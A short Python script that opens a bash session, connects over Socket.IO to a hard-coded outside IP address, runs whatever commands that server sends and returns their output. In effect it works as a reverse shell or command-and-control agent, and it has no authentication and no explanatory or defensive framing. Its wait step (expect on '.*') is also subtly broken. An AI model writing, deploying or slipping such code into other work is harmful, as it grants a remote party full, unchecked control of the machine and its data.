import pexpect
import socketio

sio = socketio.Client()
child = pexpect.spawn('/bin/bash', encoding='utf-8', timeout=None)  # Start a bash session

@sio.event
def connect():
    print("Successfully connected to the server.")

@sio.event
def disconnect():
    print("Disconnected from the server.")

@sio.on('execute_command')
def on_execute_command(data):
    command = data['command']
    print(f"Executing command: {command}")
    child.sendline(command)  # Send command to the bash session
    child.expect(r'.*')  # Wait for the command to complete
    output = child.before  # Get the output of the command
    sio.emit('command_output', {'output': output})

if __name__ == '__main__':
    sio.connect('http://80.108.95.253:8000/')
    sio.wait()
